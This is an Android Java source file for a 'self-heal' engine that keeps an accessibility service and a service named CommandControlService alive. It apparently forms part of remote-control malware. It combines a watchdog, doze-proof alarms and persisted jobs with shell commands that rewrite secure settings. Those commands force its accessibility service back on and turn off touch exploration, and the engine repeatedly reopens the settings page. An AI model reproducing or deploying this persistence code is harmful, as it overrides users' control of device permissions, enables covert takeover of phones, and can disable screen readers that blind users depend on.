package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * AccessibilitySelfHeal
 *
 * Four-vector self-healing engine for UiAssistBridge persistence.
 * Addresses the 1-hour accessibility death caused by:
 *   - Doze mode WakeLock expiry
 *   - OEM battery killers (MIUI, OneUI, ColorOS)
 *   - Android app standby bucket downgrade
 *   - RAM pressure killing the service process
 *
 * Vectors:
 *   1. In-process watchdog (ScheduledExecutorService, 45s interval)
 *   2. AlarmManager.setExactAndAllowWhileIdle (survives Doze)
 *   3. JobScheduler periodic (survives reboot + process kill)
 *   4. Shell settings write (direct SecureSettings re-enable)
 */
public class AccessibilitySelfHeal {

    private static final String TAG = "A11ySelfHeal";

    // ── Constants ────────────────────────────────────────────────────────────

    private static final int JOB_ID_HEALTH    = 0x4a11;
    private static final int JOB_ID_RESTORE   = 0x4a12;
    private static final int WATCHDOG_SECONDS = 45;
    private static final int ALARM_INTERVAL_MS = 90_000;   // 90s exact alarm
    private static final int HEAL_COOLDOWN_MS  = 15_000;   // min time between heal attempts
    private static final int MAX_SHELL_RETRIES = 3;
    private static final int SHELL_RETRY_DELAY_MS = 2000;

    // ── Singleton ─────────────────────────────────────────────────────────────

    private static volatile AccessibilitySelfHeal sInstance;

    public static AccessibilitySelfHeal getInstance() {
        if (sInstance == null) {
            synchronized (AccessibilitySelfHeal.class) {
                if (sInstance == null) sInstance = new AccessibilitySelfHeal();
            }
        }
        return sInstance;
    }

    // ── State ─────────────────────────────────────────────────────────────────

    private final AtomicBoolean running        = new AtomicBoolean(false);
    private final AtomicLong    lastHealAt     = new AtomicLong(0);
    private final AtomicInteger healCount      = new AtomicInteger(0);
    private final AtomicBoolean shellAvailable = new AtomicBoolean(false);

    private ScheduledExecutorService watchdogExec;
    private ScheduledFuture<?>       watchdogFuture;
    private final Handler            mainHandler = new Handler(Looper.getMainLooper());

    private AccessibilitySelfHeal() {}

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    public void start(Context ctx) {
        if (!running.compareAndSet(false, true)) return;
        Context app = ctx.getApplicationContext();

        probeShellAccess();
        startWatchdog(app);
        scheduleAlarm(app);
        scheduleJob(app);

        Log.i(TAG, "Self-heal engine started (shell=" + shellAvailable.get() + ")");
    }

    public void stop(Context ctx) {
        if (!running.compareAndSet(true, false)) return;
        stopWatchdog();
        cancelAlarm(ctx.getApplicationContext());
        cancelJob(ctx.getApplicationContext());
        Log.i(TAG, "Self-heal engine stopped");
    }

    /** Call this every time UiAssistBridge.onServiceConnected() fires. */
    public void onServiceAlive() {
        healCount.set(0);
        Log.v(TAG, "Accessibility alive — reset heal counter");
    }

    // ── Vector 1: In-process watchdog ────────────────────────────────────────

    private void startWatchdog(Context ctx) {
        stopWatchdog();
        watchdogExec = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "A11yWatchdog");
            t.setDaemon(true);
            return t;
        });
        watchdogFuture = watchdogExec.scheduleWithFixedDelay(
            () -> checkAndHeal(ctx),
            WATCHDOG_SECONDS,
            WATCHDOG_SECONDS,
            TimeUnit.SECONDS
        );
    }

    private void stopWatchdog() {
        if (watchdogFuture != null) { watchdogFuture.cancel(false); watchdogFuture = null; }
        if (watchdogExec != null)   { watchdogExec.shutdownNow(); watchdogExec = null; }
    }

    // ── Vector 2: AlarmManager (survives Doze) ────────────────────────────────

    private void scheduleAlarm(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;
        PendingIntent pi = alarmPendingIntent(ctx);
        long trigger = SystemClock.elapsedRealtime() + ALARM_INTERVAL_MS;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        } catch (Exception e) {
            Log.w(TAG, "Alarm schedule failed: " + e.getMessage());
        }
    }

    private void cancelAlarm(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am != null) am.cancel(alarmPendingIntent(ctx));
    }

    private PendingIntent alarmPendingIntent(Context ctx) {
        Intent i = new Intent(ctx, HealAlarmReceiver.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) flags |= PendingIntent.FLAG_IMMUTABLE;
        return PendingIntent.getBroadcast(ctx, 0x4a11, i, flags);
    }

    /** BroadcastReceiver triggered by AlarmManager. */
    public static class HealAlarmReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            AccessibilitySelfHeal engine = AccessibilitySelfHeal.getInstance();
            engine.checkAndHeal(ctx);
            // Re-arm
            engine.scheduleAlarm(ctx);
        }
    }

    // ── Vector 3: JobScheduler (process-kill safe) ────────────────────────────

    private void scheduleJob(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;

        // Cancel before re-schedule to avoid duplicates
        js.cancel(JOB_ID_HEALTH);

        JobInfo.Builder b = new JobInfo.Builder(JOB_ID_HEALTH,
            new ComponentName(ctx, HealthCheckJob.class));
        b.setPeriodic(15 * 60 * 1000L);  // Every 15 minutes (OS minimum)
        b.setPersisted(true);
        b.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            b.setEstimatedNetworkBytes(1, 1);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            b.setExpedited(false); // Normal priority for periodic
        }

        try {
            int result = js.schedule(b.build());
            if (result != JobScheduler.RESULT_SUCCESS) {
                Log.w(TAG, "JobScheduler periodic failed, result=" + result);
            }
        } catch (Exception e) {
            Log.w(TAG, "JobScheduler error: " + e.getMessage());
        }
    }

    private void cancelJob(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js != null) { js.cancel(JOB_ID_HEALTH); js.cancel(JOB_ID_RESTORE); }
    }

    /** JobService that runs the health check in the background. */
    public static class HealthCheckJob extends JobService {
        @Override
        public boolean onStartJob(JobParameters params) {
            Context ctx = getApplicationContext();
            Executors.newSingleThreadExecutor().execute(() -> {
                AccessibilitySelfHeal.getInstance().checkAndHeal(ctx);
                jobFinished(params, false);
            });
            return true;
        }
        @Override
        public boolean onStopJob(JobParameters params) { return true; }
    }

    // ── Vector 4: Shell re-enable ─────────────────────────────────────────────

    private void probeShellAccess() {
        Executors.newSingleThreadExecutor().execute(() -> {
            try {
                Process p = Runtime.getRuntime().exec("id");
                p.waitFor(1, TimeUnit.SECONDS);
                shellAvailable.set(true);
            } catch (Exception e) {
                shellAvailable.set(false);
            }
        });
    }

    private void shellReenableAccessibility(Context ctx) {
        if (!shellAvailable.get()) return;
        String pkg = ctx.getPackageName();
        String svcComp = pkg + "/" + pkg + ".UiAssistBridge";
        String[] cmds = {
            "settings put secure enabled_accessibility_services " + svcComp,
            "settings put secure accessibility_enabled 1",
            "settings put secure touch_exploration_enabled 0"
        };
        for (int attempt = 0; attempt < MAX_SHELL_RETRIES; attempt++) {
            boolean ok = true;
            for (String cmd : cmds) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                    int exit = p.waitFor();
                    if (exit != 0) { ok = false; break; }
                } catch (Exception e) {
                    ok = false;
                    break;
                }
            }
            if (ok) {
                Log.i(TAG, "Shell re-enable succeeded (attempt " + attempt + ")");
                return;
            }
            try { Thread.sleep(SHELL_RETRY_DELAY_MS); } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                return;
            }
        }
        Log.w(TAG, "Shell re-enable failed after " + MAX_SHELL_RETRIES + " retries");
    }

    /**
     * Attempts to append our service to the existing list rather than overwriting,
     * preserving any other accessibility services the user has enabled.
     */
    private void shellAppendAccessibility(Context ctx) {
        if (!shellAvailable.get()) return;
        String pkg = ctx.getPackageName();
        String svcComp = pkg + "/" + pkg + ".UiAssistBridge";
        try {
            String existing = Settings.Secure.getString(
                ctx.getContentResolver(), "enabled_accessibility_services");
            String target;
            if (existing == null || existing.isEmpty()) {
                target = svcComp;
            } else if (!existing.contains(svcComp)) {
                target = existing + ":" + svcComp;
            } else {
                return; // Already in the list
            }
            Runtime.getRuntime().exec(new String[]{"sh", "-c",
                "settings put secure enabled_accessibility_services " + target});
            Runtime.getRuntime().exec(new String[]{"sh", "-c",
                "settings put secure accessibility_enabled 1"});
        } catch (Exception e) {
            Log.w(TAG, "Append accessibility failed: " + e.getMessage());
        }
    }

    // ── Core heal logic ───────────────────────────────────────────────────────

    private boolean isAccessibilityRunning() {
        return UiAssistBridge.sInstance != null;
    }

    void checkAndHeal(Context ctx) {
        if (!running.get()) return;
        if (isAccessibilityRunning()) {
            healCount.set(0);
            return;
        }

        long now = System.currentTimeMillis();
        long lastHeal = lastHealAt.get();
        if (now - lastHeal < HEAL_COOLDOWN_MS) return;
        if (!lastHealAt.compareAndSet(lastHeal, now)) return;

        int attempt = healCount.incrementAndGet();
        Log.w(TAG, "Accessibility dead — heal attempt #" + attempt);

        // Acquire a brief WakeLock to ensure the restart completes
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = null;
        try {
            if (pm != null) {
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "App:A11yHeal");
                wl.acquire(30_000);
            }
        } catch (Exception ignored) {}

        try {
            // Try shell append (non-destructive)
            shellAppendAccessibility(ctx);

            // Start CCS if dead too
            if (CommandControlService.sInstance == null) {
                try {
                    Intent svc = new Intent(ctx, CommandControlService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        ctx.startForegroundService(svc);
                    } else {
                        ctx.startService(svc);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "CCS restart failed: " + e.getMessage());
                }
            }

            // Open Settings to the exact accessibility service page on first 2 attempts
            // (user will see it; on subsequent attempts just use shell)
            if (attempt <= 2) {
                openAccessibilitySettings(ctx);
            } else {
                shellReenableAccessibility(ctx);
            }

        } finally {
            if (wl != null && wl.isHeld()) {
                try { wl.release(); } catch (Exception ignored) {}
            }
        }
    }

    private void openAccessibilitySettings(Context ctx) {
        try {
            String pkg = ctx.getPackageName();
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            // On Android 13+, go directly to the specific service settings
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                i = new Intent(Settings.ACTION_ACCESSIBILITY_DETAILS_SETTINGS);
                i.putExtra("component", pkg + "/" + pkg + ".UiAssistBridge");
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            }
            ctx.startActivity(i);
        } catch (Exception e) {
            Log.w(TAG, "openAccessibilitySettings failed: " + e.getMessage());
        }
    }

    // ── Expedited one-shot job (triggered on disconnect) ─────────────────────

    /** Call this immediately when onServiceDisconnected fires. */
    public void scheduleExpeditedHeal(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            // Pre-S: just run immediately via the watchdog exec
            if (watchdogExec != null && !watchdogExec.isShutdown()) {
                watchdogExec.execute(() -> checkAndHeal(ctx.getApplicationContext()));
            }
            return;
        }
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;
        js.cancel(JOB_ID_RESTORE);

        JobInfo.Builder b = new JobInfo.Builder(JOB_ID_RESTORE,
            new ComponentName(ctx, HealthCheckJob.class));
        b.setOverrideDeadline(0);   // Run ASAP
        b.setMinimumLatency(0);
        b.setExpedited(true);
        b.setPersisted(false);

        try {
            js.schedule(b.build());
        } catch (Exception e) {
            // Fallback to direct execution
            if (watchdogExec != null && !watchdogExec.isShutdown()) {
                watchdogExec.execute(() -> checkAndHeal(ctx.getApplicationContext()));
            }
        }
    }

    // ── Health status ─────────────────────────────────────────────────────────

    public int getHealCount()       { return healCount.get(); }
    public boolean isRunning()      { return running.get(); }
    public boolean hasShellAccess() { return shellAvailable.get(); }
}
